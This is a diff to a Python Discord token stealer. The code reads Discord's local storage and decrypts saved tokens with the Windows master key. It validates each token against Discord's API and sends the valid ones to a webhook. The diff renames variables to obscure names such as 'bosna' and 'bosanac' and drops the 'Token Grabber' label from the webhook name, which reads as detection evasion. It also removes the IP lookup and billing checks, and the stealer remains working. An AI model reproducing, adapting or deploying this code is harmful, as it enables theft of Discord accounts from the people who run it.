@@ -9,7 +9,7 @@ from subprocess import Popen, PIPE
 import requests, json, os
 from datetime import datetime
 
-tokens = []
+bosna = []
 cleaned = []
 checker = []
 
@@ -18,16 +18,10 @@ def decrypt(buff, master_key):
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
         return "Error"
-def getip():
-    ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except: pass
-    return ip
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-def get_token():
+def get_bosanac():
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
@@ -72,29 +66,28 @@ def get_token():
                         for x in files.readlines():
                             x.strip()
                             for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                tokens.append(values)
+                                bosna.append(values)
                 except PermissionError: continue
-        for i in tokens:
+        for i in bosna:
             if i.endswith("\\"):
                 i.replace("\\", "")
             elif i not in cleaned:
                 cleaned.append(i)
-        for token in cleaned:
+        for bosanac in cleaned:
             try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+                bosancek = decrypt(b64decode(bosanac.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
             except IndexError == "Error": continue
-            checker.append(tok)
+            checker.append(bosancek)
             for value in checker:
                 if value not in already_check:
                     already_check.append(value)
-                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    headers = {'Authorization': bosancek, 'Content-Type': 'application/json'}
                     try:
                         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                     except: continue
                     if res.status_code == 200:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-                        embed = f"""__Token__\n\t`{tok}`"""
-                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - 6locc', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+                        embed = f"""__INFO:__\n\t`{bosancek}`"""
+                        payload = json.dumps({'content': embed, 'username': '6locc', 'avatar_url': 'https://www.proarmis.si/imgmagic?image=glock_17_4.5mm_bb_co2_5.8365.jpg'})
                         try:
                             headers2 = {
                                 'Content-Type': 'application/json',
@@ -105,4 +98,4 @@ def get_token():
                         except: continue
                 else: continue
 if __name__ == '__main__':
-    get_token()
+    get_bosanac()
